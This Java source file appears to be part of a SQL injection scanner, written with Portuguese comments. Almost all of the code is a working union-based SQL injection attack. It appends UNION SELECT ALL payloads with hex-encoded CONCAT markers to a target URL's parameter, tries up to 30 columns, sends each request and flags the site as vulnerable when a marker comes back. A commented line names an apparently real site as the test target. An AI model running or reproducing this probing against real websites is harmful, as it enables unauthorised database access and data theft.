/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ControladorMySql;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.util.regex.Pattern;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

/**
 *
 * @author x01k
 */
public class UnionBased {

    private String url; // Variavel que recebe as url temporariamente

    // Método construtor padrão
    public UnionBased() {
    }

    // Método construtor que recebe Url
    public UnionBased(String url) {
        setUrl(url); // Envia a url para o metodo setUrl
        new Thread(iniciaTeste).start(); // Inicia uma Thread com o método iniciaTeste
    }

    // Método getter 
    private String getUrl() {
        return url; // retorna a variavel
    }

    // Método setter 
    private void setUrl(String url) {
        this.url = url; // Setando a url na variavel
    }
    // Método que inicia o teste
    private Runnable iniciaTeste = new Runnable() {
        @Override
        public void run() {
            getUnion(getUrl()); // Enviando a url para o metodo get
        }
    };

    private HttpClient client() {
        return new DefaultHttpClient();
    }
    HttpResponse response;

    public void getUnion(String recebeUrl) {
        try {
            boolean encontro = true;
            int colunas = 30;
            String payload = "";
            String url = recebeUrl + "+UNION+SELECT+ALL";
            //String url = "http://a8lejmad01.com.br/teste/altera.php?id=1+UNION+SELECT+ALL";

            for (int i = 0; i < colunas; i++) {
                if (i > 0) {
                    payload = payload + ",CONCAT(0x783031,0x50656e74657374,0x783031)";
                } else {
                    payload = payload + "+CONCAT(0x783031,0x50656e74657374,0x783031)";
                }
                //System.out.println(url + payload);

                HttpGet request = new HttpGet(url + payload);

                response = client().execute(request);
                HttpEntity entity = response.getEntity();

                BufferedReader rd = new BufferedReader(new InputStreamReader(
                        response.getEntity().getContent()));

                String line = "";
                while ((line = rd.readLine()) != null && encontro == true) {
                    //System.out.println(line);                
                    if (verifica(line)) {
                        System.err.println("->  " + url + " " + response.getStatusLine() + " Vulneravel - MySqlUnion " + payload);
                        encontro = false;
                    }

                }
                EntityUtils.consume(entity);
            }

        } catch (Exception e) {
        }
    }

    String payload;

    private boolean verifica(String recebeCodigoFonte) {
        String content = recebeCodigoFonte;
        boolean isMatch = false;
        int qntArquivo = 2;
        try {
            BufferedReader a = new BufferedReader(new FileReader("arquivo" + qntArquivo + ".txt"));
            while (a.ready()) {
                String pattern = ".*" + a.readLine() + ".*";

                isMatch = Pattern.matches(pattern, content);
                if (isMatch) {
                    payload = pattern;
                    //System.out.println(linha);
                    return isMatch;
                }
            }
            a.close();
        } catch (Exception e) {
            //System.out.println(e);
        }
        return isMatch;
    }
    
        public static void unionallselect1UnionInteger(String url) {        
        String formataUrl = url;
        int colunas = 30;
        String unionallselect1 = "999999.9+union+all+select+0x393133353134353632312e39";
        String monta = null;
        for (int i = 0; i < colunas; i++) {
            formataUrl = url;
            if (formataUrl.contains("!-!")) {
                if (i == 0) {
                    monta = unionallselect1;
                } else {
                    monta = monta + ","+unionallselect1;
                }
                formataUrl = formataUrl.replaceAll("!-!", monta);
                System.out.println(formataUrl);
            }
        }
    }

}
